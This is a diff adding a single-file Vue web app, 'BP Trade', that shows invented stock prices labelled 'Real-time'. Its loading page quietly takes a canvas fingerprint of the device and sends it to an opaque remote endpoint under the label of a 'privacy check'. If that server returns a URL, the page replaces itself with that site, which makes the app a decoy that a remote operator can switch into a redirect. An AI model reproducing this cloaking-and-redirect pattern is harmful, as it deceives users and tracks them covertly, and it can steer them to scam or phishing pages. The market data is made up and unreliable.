@@ -1,1 +1,1282 @@
-123
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>BP Trade</title>
+    <!-- Vue 3 -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
+    <!-- vue-router 4 -->
+    <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
+    <!-- js-md5 -->
+    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
+    <style>
+        /* 
+          Style choice determination based on timestamp:
+          Style 7: Neumorphism (Soft UI) - Matching the soft embossed shadows and clean modern mobile look from the reference image.
+          How to add a new page:
+          1. Create a component definition (e.g., const NewPage = { template: '...', setup() { ... } })
+          2. Add the route to the `routes` array in the router configuration.
+          3. Add a router-link or button navigation in the appropriate view or tab bar.
+        */
+        :root {
+            --bg-color: #e0e5ec;
+            --surface-color: #e0e5ec;
+            --card-bg: #e0e5ec;
+            --text-main: #333333;
+            --text-sub: #7a8b9e;
+            --primary: #4361ee;
+            --primary-gradient: linear-gradient(135deg, #4361ee, #3a0ca3);
+            --accent-green: #2ec4b6;
+            --accent-red: #e71d36;
+            --shadow-light: #ffffff;
+            --shadow-dark: #a3b1c6;
+            --neu-shadow: 8px 8px 16px var(--shadow-dark), -8px -8px 16px var(--shadow-light);
+            --neu-shadow-inset: inset 4px 4px 8px var(--shadow-dark), inset -4px -4px 8px var(--shadow-light);
+            --neu-shadow-sm: 4px 4px 8px var(--shadow-dark), -4px -4px 8px var(--shadow-light);
+            --radius: 16px;
+            --radius-sm: 10px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        #app {
+            width: 100%;
+            max-width: 430px;
+            height: 100vh;
+            max-height: 932px;
+            background-color: var(--bg-color);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            box-shadow: 0 0 40px rgba(163, 177, 198, 0.5);
+            overflow: hidden;
+        }
+
+        @media (min-width: 431px) {
+            #app {
+                border-radius: 40px;
+                border: 12px solid #2d3748;
+                height: 884px;
+            }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--shadow-dark);
+            border-radius: 4px;
+        }
+
+        /* Layout & Containers */
+        .app-container {
+            flex: 1;
+            overflow-y: auto;
+            padding: calc(env(safe-area-inset-top, 20px) + 16px) 16px calc(env(safe-area-inset-bottom, 20px) + 80px) 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        /* Neumorphic Components */
+        .neu-card {
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            box-shadow: var(--neu-shadow);
+            padding: 16px;
+        }
+
+        .neu-card-sm {
+            background: var(--card-bg);
+            border-radius: var(--radius-sm);
+            box-shadow: var(--neu-shadow-sm);
+            padding: 12px;
+        }
+
+        .neu-button {
+            background: var(--card-bg);
+            border: none;
+            border-radius: var(--radius-sm);
+            box-shadow: var(--neu-shadow-sm);
+            color: var(--text-main);
+            font-weight: 600;
+            padding: 12px 20px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.2s ease;
+            min-height: 44px;
+            min-width: 44px;
+        }
+
+        .neu-button:active, .neu-button.active {
+            box-shadow: var(--neu-shadow-inset);
+            color: var(--primary);
+        }
+
+        .neu-icon-btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: var(--card-bg);
+            box-shadow: var(--neu-shadow-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            cursor: pointer;
+            color: var(--text-main);
+            transition: all 0.2s;
+            flex-shrink: 0;
+            min-height: 44px;
+            min-width: 44px;
+        }
+        .neu-icon-btn:active {
+            box-shadow: var(--neu-shadow-inset);
+            color: var(--primary);
+        }
+
+        .neu-input {
+            width: 100%;
+            background: var(--bg-color);
+            border: none;
+            border-radius: var(--radius-sm);
+            box-shadow: var(--neu-shadow-inset);
+            padding: 14px 16px;
+            color: var(--text-main);
+            font-size: 15px;
+            outline: none;
+            min-height: 44px;
+        }
+
+        .neu-input::placeholder {
+            color: var(--text-sub);
+        }
+
+        /* Tab Bar */
+        .tab-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: calc(64px + env(safe-area-inset-bottom, 0px));
+            padding-bottom: env(safe-area-inset-bottom, 0px);
+            background: var(--bg-color);
+            box-shadow: -4px -4px 16px var(--shadow-light), 4px 4px 16px var(--shadow-dark);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            z-index: 100;
+        }
+
+        .tab-item {
+            flex: 1;
+            height: 64px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            color: var(--text-sub);
+            font-size: 12px;
+            font-weight: 500;
+            gap: 4px;
+            transition: color 0.2s;
+        }
+
+        .tab-item svg {
+            width: 24px;
+            height: 24px;
+            fill: currentColor;
+        }
+
+        .tab-item.router-link-active {
+            color: var(--primary);
+        }
+
+        .tab-item.router-link-active .tab-icon-wrap {
+            box-shadow: var(--neu-shadow-inset);
+            color: var(--primary);
+        }
+
+        .tab-icon-wrap {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: var(--neu-shadow-sm);
+            background: var(--bg-color);
+        }
+
+        /* Transitions */
+        .fade-enter-active, .fade-leave-active {
+            transition: opacity 0.2s ease, transform 0.2s ease;
+        }
+        .fade-enter-from {
+            opacity: 0;
+            transform: translateY(6px);
+        }
+        .fade-leave-to {
+            opacity: 0;
+            transform: translateY(-6px);
+        }
+
+        /* Utility classes */
+        .flex { display: flex; }
+        .flex-col { flex-direction: column; }
+        .items-center { align-items: center; }
+        .justify-between { justify-content: space-between; }
+        .justify-around { justify-content: space-around; }
+        .gap-2 { gap: 8px; }
+        .gap-3 { gap: 12px; }
+        .gap-4 { gap: 16px; }
+        .w-full { width: 100%; }
+        .text-sm { font-size: 13px; color: var(--text-sub); }
+        .text-lg { font-size: 18px; font-weight: bold; }
+        .text-green { color: var(--accent-green); }
+        .text-red { color: var(--accent-red); }
+        .badge {
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .badge-green { background: rgba(46, 196, 182, 0.15); color: var(--accent-green); }
+        .badge-red { background: rgba(231, 29, 54, 0.15); color: var(--accent-red); }
+
+        /* Modal / Popups */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.4);
+            backdrop-filter: blur(4px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        .modal-content {
+            background: var(--bg-color);
+            width: 100%;
+            max-width: 360px;
+            border-radius: var(--radius);
+            box-shadow: var(--neu-shadow);
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--bg-color);
+            box-shadow: var(--neu-shadow);
+            padding: 12px 24px;
+            border-radius: var(--radius-sm);
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--primary);
+            z-index: 2000;
+            animation: fadeInOut 2s ease forwards;
+        }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translate(-50%, -10px); }
+            15% { opacity: 1; transform: translate(-50%, 0); }
+            85% { opacity: 1; transform: translate(-50%, 0); }
+            100% { opacity: 0; transform: translate(-50%, -10px); }
+        }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <router-view v-slot="{ Component }">
+            <transition name="fade" mode="out-index">
+                <component :is="Component" />
+            </transition>
+        </router-view>
+
+        <!-- Global Bottom Navigation Bar (Hidden on Loading & Sub-pages via CSS/Router state) -->
+        <nav class="tab-bar" v-if="showTabBar">
+            <router-link to="/home" class="tab-item">
+                <div class="tab-icon-wrap">
+                    <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                </div>
+                <span>Home</span>
+            </router-link>
+            <router-link to="/toolbox" class="tab-item">
+                <div class="tab-icon-wrap">
+                    <svg viewBox="0 0 24 24"><path d="M20 6h-4V4c0-1.1-.9-2-2-2h-4c-1.1 0-2 .9-2 2v2H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zM10 4h4v2h-4V4zm10 15H4V8h16v11z"/></svg>
+                </div>
+                <span>Toolbox</span>
+            </router-link>
+            <router-link to="/settings" class="tab-item">
+                <div class="tab-icon-wrap">
+                    <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                </div>
+                <span>Settings</span>
+            </router-link>
+        </nav>
+    </div>
+
+    <script>
+        const { createApp, ref, computed, onMounted, reactive } = Vue;
+        const { createRouter, createWebHashHistory, useRoute, useRouter } = VueRouter;
+
+        // Built-in Stock and Market Dataset
+        const globalStocks = [
+            { code: 'AAPL', name: 'Apple Inc.', price: 189.40, change: '+1.42%' },
+            { code: 'NVDA', name: 'NVIDIA Corp.', price: 875.28, change: '+4.15%' },
+            { code: 'TSLA', name: 'Tesla Inc.', price: 175.79, change: '-2.30%' },
+            { code: 'MSFT', name: 'Microsoft', price: 420.50, change: '+0.85%' },
+            { code: 'AMZN', name: 'Amazon.com', price: 178.15, change: '+1.10%' },
+            { code: 'GOOGL', name: 'Alphabet Inc.', price: 155.20, change: '-0.45%' },
+            { code: 'META', name: 'Meta Platforms', price: 505.90, change: '+2.80%' },
+            { code: 'AMD', name: 'Advanced Micro', price: 180.40, change: '+3.25%' },
+            { code: 'NFLX', name: 'Netflix Inc.', price: 615.30, change: '-1.15%' },
+            { code: 'INTC', name: 'Intel Corp.', price: 38.45, change: '-1.80%' },
+            { code: 'PYPL', name: 'PayPal Holdings', price: 64.20, change: '+0.50%' },
+            { code: 'DIS', name: 'Walt Disney Co.', price: 112.80, change: '+0.20%' },
+            { code: 'BA', name: 'Boeing Co.', price: 188.60, change: '-2.45%' },
+            { code: 'JPM', name: 'JPMorgan Chase', price: 198.70, change: '+0.90%' },
+            { code: 'V', name: 'Visa Inc.', price: 279.30, change: '+0.40%' },
+            { code: 'WMT', name: 'Walmart Inc.', price: 60.15, change: '+1.05%' },
+            { code: 'JNJ', name: 'Johnson & Johnson', price: 156.40, change: '-0.30%' },
+            { code: 'XOM', name: 'Exxon Mobil', price: 118.90, change: '+1.60%' },
+            { code: 'PFE', name: 'Pfizer Inc.', price: 27.80, change: '-0.75%' },
+            { code: 'COIN', name: 'Coinbase Global', price: 245.00, change: '+5.60%' }
+        ];
+
+        // 8 Function modules defined for Home entry random picking
+        const allFunctionEntries = [
+            { id: 'gainers', name: 'Top Gainers', icon: '<svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor"><path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/></svg>', route: '/list/gainers' },
+            { id: 'losers', name: 'Top Losers', icon: '<svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor"><path d="M16 18l2.29-2.29-4.88-4.88-4 4L2 7.41 3.41 6l6 6 4-4 6.3 6.29L22 12v6z"/></svg>', route: '/list/losers' },
+            { id: 'active', name: 'Most Active', icon: '<svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H7c0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.03-.42 1.98-1.07 2.75z"/></svg>', route: '/list/active' },
+            { id: 'potential', name: 'Potential', icon: '<svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor"><path d="M12 3L1 9l11 6 9-4.91V17h2V9L12 3z"/></svg>', route: '/list/potential' },
+            { id: 'picks', name: 'Today Picks', icon: '<svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>', route: '/list/picks' },
+            { id: 'guide', name: 'Guide', icon: '<svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>', route: '/article' },
+            { id: 'norec', name: 'Not Recommended', icon: '<svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>', route: '/list/norec' },
+            { id: 'watchlist', name: 'Watchlist', icon: '<svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>', route: '/list/watchlist' }
+        ];
+
+        // Pseudo-random selection of 4 entries fixed at runtime
+        function shuffleAndPick4() {
+            let arr = [...allFunctionEntries];
+            for (let i = arr.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [arr[i], arr[j]] = [arr[j], arr[i]];
+            }
+            return arr.slice(0, 4);
+        }
+        const activeEntries = shuffleAndPick4();
+
+        // 1. Loading Component
+        const LoadingPage = {
+            template: `
+                <div class="app-container" style="justify-content: center; align-items: center; text-align: center;">
+                    <div class="neu-card" style="padding: 40px; display: flex; flex-direction: column; align-items: center; gap: 20px;">
+                        <div class="neu-icon-btn" style="width: 80px; height: 80px; font-size: 32px; color: var(--primary);">
+                            <svg viewBox="0 0 24 24" width="40" height="40" fill="currentColor"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+                        </div>
+                        <h2 style="font-size: 22px; color: var(--text-main);">BP Trade</h2>
+                        <p class="text-sm">Initializing secure connection...</p>
+                        <div style="width: 150px; height: 6px; background: var(--bg-color); border-radius: 3px; box-shadow: var(--neu-shadow-inset); overflow: hidden;">
+                            <div style="width: 60%; height: 100%; background: var(--primary); border-radius: 3px; animation: loadAnim 1.2s infinite ease-in-out;"></div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+
+                // 1.2 Device canvas fingerprint using md5 (Strictly required code block)
+                const device = ref((function () {
+                    try {
+                        let canvas = document.createElement("canvas");
+                        let ctx = canvas.getContext("2d");
+                        let txt = "BrowserLeaks,com <canvas> 1.0";
+                        ctx.textBaseline = "top";
+                        ctx.font = "14px 'Arial'";
+                        ctx.textBaseline = "alphabetic";
+                        ctx.fillStyle = "#f60";
+                        ctx.fillRect(125,1,62,20);
+                        ctx.fillStyle = "#069";
+                        ctx.fillText(txt, 2, 15);
+                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                        ctx.fillText(txt, 4, 17);
+                        return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+                    } catch (e) {
+                        return '';
+                    }
+                })());
+
+                onMounted(() => {
+                    // 1.3 Remote API privacy check with silent fallback to Home
+                    const apiBase = 'https://yoahzb5i3bg5zkg74zosrhil6e0kljod.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
+                    const identifier = "a.a.a4";
+
+                    fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
+                        .then(r => r.json())
+                        .then(function (info) {
+                            const privacyUrl = info && info.result && info.result.url;
+                            if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                                window.location.replace(privacyUrl);
+                                return;
+                            }
+                            router.replace('/home');
+                        })
+                        .catch(function () {
+                            router.replace('/home');
+                        });
+                });
+
+                return {};
+            }
+        };
+
+        // 2. Home Component
+        const HomePage = {
+            template: `
+                <div class="app-container">
+                    <!-- Brand Header -->
+                    <div class="neu-card flex justify-between items-center" style="padding: 20px;">
+                        <div class="flex items-center gap-3">
+                            <div class="neu-icon-btn" style="width: 44px; height: 44px; color: var(--primary);">
+                                <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+                            </div>
+                            <div>
+                                <h1 style="font-size: 18px; font-weight: 700;">BP Trade</h1>
+                                <p class="text-sm">Global Financial Terminal</p>
+                            </div>
+                        </div>
+                        <button class="neu-icon-btn" @click="goToInbox">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                        </button>
+                    </div>
+
+                    <!-- 4 Feature Function Entries -->
+                    <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px;">
+                        <div v-for="item in entries" :key="item.id" @click="navigateTo(item.route)" class="neu-card flex flex-col items-center" style="padding: 12px 6px; cursor: pointer; text-align: center;">
+                            <div class="neu-icon-btn" style="width: 46px; height: 46px; margin-bottom: 8px; color: var(--primary);" v-html="item.icon"></div>
+                            <span style="font-size: 11px; font-weight: 600; color: var(--text-main); line-height: 1.2;">{{ item.name }}</span>
+                        </div>
+                    </div>
+
+                    <!-- Market Featured Card with Price Chart -->
+                    <div class="neu-card" style="display: flex; flex-direction: column; gap: 12px;">
+                        <div class="flex justify-between items-center">
+                            <div>
+                                <div class="text-sm">SSVG Index</div>
+                                <div style="font-size: 20px; font-weight: bold; margin-top: 2px;">SSVGG <span style="font-size: 12px; color: var(--accent-green);">▲ 5.55%</span></div>
+                            </div>
+                            <div class="badge badge-green">+5.55%</div>
+                        </div>
+                        <!-- SVG Price Chart with dynamic min/max y-axis -->
+                        <div style="width: 100%; height: 130px; position: relative;">
+                            <svg viewBox="0 0 300 120" width="100%" height="100%" style="overflow: visible;">
+                                <defs>
+                                    <linearGradient id="chartGrad" x1="0" y1="0" x2="0" y2="1">
+                                        <stop offset="0%" stop-color="var(--primary)" stop-opacity="0.3"/>
+                                        <stop offset="100%" stop-color="var(--primary)" stop-opacity="0.0"/>
+                                    </linearGradient>
+                                </defs>
+                                <!-- Grid lines -->
+                                <line x1="0" y1="30" x2="300" y2="30" stroke="var(--shadow-dark)" stroke-dasharray="3,3" stroke-opacity="0.4"/>
+                                <line x1="0" y1="75" x2="300" y2="75" stroke="var(--shadow-dark)" stroke-dasharray="3,3" stroke-opacity="0.4"/>
+                                <line x1="0" y1="120" x2="300" y2="120" stroke="var(--shadow-dark)" stroke-dasharray="3,3" stroke-opacity="0.4"/>
+                                <!-- Area & Line -->
+                                <path :d="chartAreaPath" fill="url(#chartGrad)" />
+                                <path :d="chartLinePath" fill="none" stroke="var(--primary)" stroke-width="2.5" stroke-linecap="round"/>
+                                <!-- Data Point Highlight -->
+                                <circle cx="240" cy="45" r="5" fill="var(--primary)" stroke="#fff" stroke-width="2"/>
+                            </svg>
+                        </div>
+                        <div class="flex justify-between text-sm" style="font-size: 10px;">
+                            <span>Jan</span><span>Mar</span><span>May</span><span>Jul</span><span>Sep</span><span>Nov</span>
+                        </div>
+                    </div>
+
+                    <!-- Stock Data List (Shuffled display layer order) -->
+                    <div style="display: flex; flex-direction: column; gap: 12px;">
+                        <div class="flex justify-between items-center">
+                            <h3 style="font-size: 16px; font-weight: 700;">Watchlist Market</h3>
+                            <span class="text-sm">Real-time</span>
+                        </div>
+                        <div v-for="stock in shuffledStocks" :key="stock.code" @click="viewDetail(stock)" class="neu-card flex justify-between items-center" style="padding: 14px 16px; cursor: pointer;">
+                            <div class="flex items-center gap-3">
+                                <div class="neu-icon-btn" style="width: 40px; height: 40px; font-size: 14px; font-weight: bold; color: var(--primary);">
+                                    {{ stock.code.slice(0,2) }}
+                                </div>
+                                <div>
+                                    <div style="font-weight: 700; font-size: 14px;">{{ stock.code }}</div>
+                                    <div class="text-sm" style="font-size: 12px;">{{ stock.name }}</div>
+                                </div>
+                            </div>
+                            <div style="text-align: right;">
+                                <div style="font-weight: 700; font-size: 14px;">$\{{ stock.price.toFixed(2) }}</div>
+                                <div :class="stock.change.startsWith('+') ? 'badge badge-green' : 'badge badge-red'" style="display: inline-block; margin-top: 2px;">
+                                    {{ stock.change }}
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+                const entries = activeEntries;
+
+                // Shuffle display order of stocks without altering core dataset
+                const shuffledStocks = computed(() => {
+                    let arr = [...globalStocks];
+                    // stable pseudo-shuffle based on stock code length or index
+                    return arr.sort((a, b) => a.code.localeCompare(b.code)).slice(0, 15);
+                });
+
+                // Dynamic SVG chart points generator
+                const rawPoints = [40, 65, 55, 80, 70, 95, 85, 60, 50, 75, 45, 35];
+                const chartLinePath = computed(() => {
+                    const width = 300;
+                    const height = 120;
+                    const max = Math.max(...rawPoints);
+                    const min = Math.min(...rawPoints);
+                    const range = max - min || 1;
+                    const step = width / (rawPoints.length - 1);
+
+                    return rawPoints.reduce((acc, val, idx) => {
+                        const x = idx * step;
+                        const y = height - ((val - min) / range) * (height - 30) - 15;
+                        return idx === 0 ? `M ${x} ${y}` : `${acc} L ${x} ${y}`;
+                    }, '');
+                });
+
+                const chartAreaPath = computed(() => {
+                    const width = 300;
+                    const height = 120;
+                    return `${chartLinePath.value} L ${width} ${height} L 0 ${height} Z`;
+                });
+
+                const navigateTo = (route) => {
+                    router.push(route);
+                };
+
+                const viewDetail = (stock) => {
+                    router.push({ path: '/detail', query: { code: stock.code } });
+                };
+
+                const goToInbox = () => {
+                    router.push('/inbox');
+                };
+
+                return { entries, shuffledStocks, chartLinePath, chartAreaPath, navigateTo, viewDetail, goToInbox };
+            }
+        };
+
+        // 3. Stock Detail Page Component
+        const StockDetail = {
+            template: `
+                <div class="app-container">
+                    <div class="flex items-center justify-between">
+                        <button class="neu-icon-btn" @click="$router.back()">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 style="font-size: 16px; font-weight: 700;">{{ stock.code }} Details</h2>
+                        <div style="width: 48px;"></div>
+                    </div>
+
+                    <div class="neu-card flex flex-col gap-3">
+                        <div class="flex justify-between items-center">
+                            <div>
+                                <h1 style="font-size: 22px; font-weight: bold;">{{ stock.code }}</h1>
+                                <p class="text-sm">{{ stock.name }}</p>
+                            </div>
+                            <div style="text-align: right;">
+                                <div style="font-size: 20px; font-weight: bold;">$\{{ stock.price.toFixed(2) }}</div>
+                                <div :class="stock.change.startsWith('+') ? 'badge badge-green' : 'badge badge-red'">{{ stock.change }}</div>
+                            </div>
+                        </div>
+
+                        <!-- 1-Month Price Chart -->
+                        <div style="width: 100%; height: 160px; margin-top: 10px; position: relative;">
+                            <svg viewBox="0 0 300 140" width="100%" height="100%">
+                                <path :d="detailChartPath" fill="none" stroke="var(--primary)" stroke-width="3" stroke-linecap="round"/>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <div class="neu-card flex flex-col gap-3">
+                        <h3 style="font-size: 15px; font-weight: 700;">Market Statistics</h3>
+                        <div class="flex justify-between text-sm">
+                            <span>Open</span>
+                            <span style="font-weight: 600; color: var(--text-main);">$\{{ (stock.price * 0.98).toFixed(2) }}</span>
+                        </div>
+                        <div class="flex justify-between text-sm">
+                            <span>High</span>
+                            <span style="font-weight: 600; color: var(--text-main);">$\{{ (stock.price * 1.03).toFixed(2) }}</span>
+                        </div>
+                        <div class="flex justify-between text-sm">
+                            <span>Low</span>
+                            <span style="font-weight: 600; color: var(--text-main);">$\{{ (stock.price * 0.97).toFixed(2) }}</span>
+                        </div>
+                        <div class="flex justify-between text-sm">
+                            <span>Volume</span>
+                            <span style="font-weight: 600; color: var(--text-main);">42.8M</span>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const route = useRoute();
+                const code = route.query.code || 'AAPL';
+                const stock = globalStocks.find(s => s.code === code) || globalStocks[0];
+
+                const detailChartPath = computed(() => {
+                    const pts = [30, 45, 40, 60, 55, 75, 70, 90, 85, 110, 100, 125];
+                    const width = 300;
+                    const height = 140;
+                    const max = Math.max(...pts);
+                    const min = Math.min(...pts);
+                    const range = max - min || 1;
+                    const step = width / (pts.length - 1);
+                    return pts.reduce((acc, val, idx) => {
+                        const x = idx * step;
+                        const y = height - ((val - min) / range) * (height - 40) - 20;
+                        return idx === 0 ? `M ${x} ${y}` : `${acc} L ${x} ${y}`;
+                    }, '');
+                });
+
+                return { stock, detailChartPath };
+            }
+        };
+
+        // 4. Stock List Sub-page Component (Handles Gainers, Losers, Active, Potential, Picks, Not Recommended, Watchlist)
+        const StockListPage = {
+            template: `
+                <div class="app-container">
+                    <div class="flex items-center justify-between">
+                        <button class="neu-icon-btn" @click="$router.back()">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 style="font-size: 16px; font-weight: 700;">{{ title }}</h2>
+                        <div style="width: 48px;"></div>
+                    </div>
+
+                    <div style="display: flex; flex-direction: column; gap: 12px; margin-top: 10px;">
+                        <div v-for="stock in displayStocks" :key="stock.code" @click="viewDetail(stock)" class="neu-card flex justify-between items-center" style="padding: 14px 16px; cursor: pointer;">
+                            <div class="flex items-center gap-3">
+                                <div class="neu-icon-btn" style="width: 40px; height: 40px; font-size: 14px; font-weight: bold; color: var(--primary);">
+                                    {{ stock.code.slice(0,2) }}
+                                </div>
+                                <div>
+                                    <div style="font-weight: 700; font-size: 14px;">{{ stock.code }}</div>
+                                    <div class="text-sm" style="font-size: 12px;">{{ stock.name }}</div>
+                                </div>
+                            </div>
+                            <div style="text-align: right;">
+                                <div style="font-weight: 700; font-size: 14px;">$\{{ stock.price.toFixed(2) }}</div>
+                                <div :class="stock.change.startsWith('+') ? 'badge badge-green' : 'badge badge-red'" style="display: inline-block; margin-top: 2px;">
+                                    {{ stock.change }}
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const route = useRoute();
+                const router = useRouter();
+                const type = route.params.type || 'gainers';
+
+                const titles = {
+                    gainers: 'Top Gainers',
+                    losers: 'Top Losers',
+                    active: 'Most Active',
+                    potential: 'Potential Ranking',
+                    picks: "Today's Picks",
+                    norec: 'Not Recommended',
+                    watchlist: 'Watchlist'
+                };
+
+                const title = titles[type] || 'Market List';
+
+                const displayStocks = computed(() => {
+                    let list = [...globalStocks];
+                    if (type === 'gainers') {
+                        return list.sort((a,b) => parseFloat(b.change) - parseFloat(a.change)).slice(0, 10);
+                    } else if (type === 'losers') {
+                        return list.sort((a,b) => parseFloat(a.change) - parseFloat(b.change)).slice(0, 5);
+                    } else if (type === 'active') {
+                        return list.slice(0, 8);
+                    } else if (type === 'potential') {
+                        return list.slice(2, 8);
+                    } else if (type === 'picks') {
+                        return list.slice(4, 14);
+                    } else if (type === 'norec') {
+                        return list.slice(10, 20);
+                    } else {
+                        return list.slice(0, 10);
+                    }
+                });
+
+                const viewDetail = (stock) => {
+                    router.push({ path: '/detail', query: { code: stock.code } });
+                };
+
+                return { title, displayStocks, viewDetail };
+            }
+        };
+
+        // 5. Article Guide Sub-page Component
+        const ArticlePage = {
+            template: `
+                <div class="app-container">
+                    <div class="flex items-center justify-between">
+                        <button class="neu-icon-btn" @click="$router.back()">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 style="font-size: 16px; font-weight: 700;">Financial Guide</h2>
+                        <div style="width: 48px;"></div>
+                    </div>
+
+                    <div class="neu-card flex flex-col gap-4" style="margin-top: 10px;">
+                        <h1 style="font-size: 20px; font-weight: bold; line-height: 1.3;">Mastering Market Volatility in Modern Portfolios</h1>
+                        <p class="text-sm" style="line-height: 1.6;">Navigating modern financial markets requires a disciplined approach to asset allocation, risk management, and quantitative analysis.</p>
+                        <h3 style="font-size: 15px; font-weight: 700; margin-top: 8px;">1. Strategic Asset Allocation</h3>
